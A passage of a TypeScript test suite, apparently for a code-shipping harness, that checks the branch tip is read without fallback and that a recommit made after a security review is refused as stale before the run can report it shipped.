      "headSha did not come from the step that read git — the comparison is against itself",
    ).toBe(OTHER_SHA);
    expect(opts.label).toBe("head-sha");
    expect(prompt).toContain("git rev-parse HEAD");
    // Read from the directory that owns the branch. Anywhere else measures the
    // wrong tree: rook's own worktree is cut from origin/main, which is the
    // #129 defect one layer out.
    expect(prompt).toContain("cd '/Users/dev/proj/.claude/worktrees/wf_a-1'");
  });

  test("an unreadable branch tip stays unreadable", async () => {
    // No fallback. "The step said nothing, so assume it matches" is the
    // fail-open this whole issue is about.
    for (const reply of [undefined, null, {}, { headSha: "" }]) {
      const { headSha } = await readHead(reply, SHA);
      expect(headSha, `${JSON.stringify(reply)} was substituted with something`).not.toBe(SHA);
    }
  });

  test("the tip is read before the decision that uses it", () => {
    expect(shipSource.indexOf("// ──── HEAD-SHA-START ────")).toBeLessThan(
      shipSource.indexOf(DECISION_START),
    );
  });
});

describe("AC-6 (#169): a recommit after the security decision is refused", () => {
  /** The guard ship.js runs, extracted and executed. */
  function loadRecommitGuard(): (
    reviewedSha: unknown,
    reCommit: unknown,
    ctx: { issue: number; slug: string; workDir: string; phase: string },
  ) => Record<string, unknown> | null {
    const block = sliceBlock(RECOMMIT_START, RECOMMIT_END);
    return new Function("reviewIsCurrent", `${block}\nreturn recommitStaleRefusal`)(
      inlined.reviewIsCurrent,
    );
  }

  const CTX = { issue: 169, slug: "pai-harness-169", workDir: "/tmp/work", phase: "Ship" };

  test("a recommit that moved the branch is refused", () => {
    const refusal = loadRecommitGuard()(SHA, { parentSha: SHA, commitSha: OTHER_SHA }, CTX);
    expect(refusal, "the ship regression recommit shipped code nobody reviewed").not.toBeNull();
    expect(refusal?.status).toBe("SHIP_FAILED");
    expect(String(refusal?.reason)).toContain("SECURITY_REVIEW_STALE");
    expect(String(refusal?.reason)).toContain(OTHER_SHA);
    expect(refusal?.issue).toBe(169);
    expect(refusal?.workDir).toBe("/tmp/work");
  });

  test("a recommit that committed nothing is not refused", () => {
    // The positive control, and the ordinary outcome of the ship remediation
    // loop: the gate failed on ceremony, nothing was committed, and the tip is
    // still the reviewed commit.
    expect(loadRecommitGuard()(SHA, { parentSha: SHA, commitSha: SHA }, CTX)).toBeNull();
  });

  test("a recommit reporting an abbreviation of the reviewed commit is not refused", () => {
    expect(loadRecommitGuard()(SHA, { parentSha: SHA, commitSha: SHA.slice(0, 7) }, CTX)).toBeNull();
  });

  test("a recommit that reports nothing usable is refused", () => {
    for (const reply of [undefined, null, "ok", {}, { parentSha: SHA }, { commitSha: "HEAD" }]) {
      expect(
        loadRecommitGuard()(SHA, reply, CTX),
        `${JSON.stringify(reply)} left the run free to report SHIPPED`,
      ).not.toBeNull();
    }
  });

  /**
   * The CALL SITE, extracted and executed.
   *
   * The first version of this suite asserted that ship.js contains
   * `recommitStaleRefusal(reviewSha, reCommit` and that the call comes before
   * the SHIPPED return. Deleting the `return shipStale` left all 126 tests
   * green: the call was still there, it just did nothing with its answer.
   * That mutation was run, and this is what it bought
   * (.claude/rules/checks-must-be-able-to-fail.md).
   */
  function runShipGuard(reviewedSha: unknown, reCommit: unknown) {
    const logs: string[] = [];
    const block = sliceBlock(
      "// ──── SHIP-RECOMMIT-GUARD-START ────",
      "// ──── SHIP-RECOMMIT-GUARD-END ────",
    );
    const out = new Function(
      "recommitStaleRefusal", "reviewSha", "reCommit", "log", "ISSUE", "SLUG", "WORK_DIR",
      `${block}\nreturn undefined`,
    )(
      loadRecommitGuard(),
      reviewedSha,
      reCommit,
      (m: unknown) => logs.push(String(m)),
      169,
      "pai-harness-169",
      "/tmp/work",
    ) as Record<string, unknown> | undefined;
    return { out, logs };
  }

  test("the ship loop returns the recommit refusal rather than logging it", () => {
    const { out, logs } = runShipGuard(SHA, { parentSha: SHA, commitSha: OTHER_SHA });
    expect(out?.status, "the ship remediation round continued to SHIPPED").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("SECURITY_REVIEW_STALE");
    expect(logs.some(l => /SECURITY BLOCK/.test(l))).toBe(true);
  });

  test("the ship loop carries on when the recommit changed nothing", () => {
    // The positive control for the call site: a guard that returns on every
    // round would make the remediation loop unusable.
    const { out } = runShipGuard(SHA, { parentSha: SHA, commitSha: SHA });
    expect(out, "a recommit that committed nothing stopped the run").toBeUndefined();
  });

  test("the recommit guard sits after the recommit it guards", () => {
    const callSite = shipSource.indexOf("recommitStaleRefusal(reviewSha, reCommit");
    expect(callSite, "nothing calls recommitStaleRefusal").toBeGreaterThan(-1);
    const recommitShip = shipSource.indexOf("label: 'recommit-ship'");
    expect(recommitShip).toBeGreaterThan(-1);
    expect(callSite, "the staleness guard runs before the recommit it guards").toBeGreaterThan(
      recommitShip,
    );
  });

  test("the recommit refusal comes before the run can report SHIPPED", () => {
    const callSite = shipSource.indexOf("recommitStaleRefusal(reviewSha, reCommit");
    const shipped = shipSource.indexOf("status: proveVerdict === 'PROVEN'");
    expect(shipped, "the SHIPPED return moved — this guard checks nothing").toBeGreaterThan(-1);
    expect(callSite, "a post-decision recommit can still reach SHIPPED").toBeLessThan(shipped);
  });
});
